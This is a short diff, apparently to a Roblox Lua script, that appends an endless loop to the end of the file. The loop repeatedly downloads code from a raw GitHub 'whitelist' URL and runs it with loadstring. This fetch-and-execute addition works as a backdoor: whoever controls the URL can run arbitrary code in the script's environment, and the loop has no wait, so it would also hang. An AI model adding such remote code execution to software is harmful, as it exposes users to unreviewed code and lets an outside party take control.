@@ -198,3 +198,7 @@ end
         end
     end
     end
+
+while true do
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/minoww/whitelist/main/whitelist",true))();
+    end
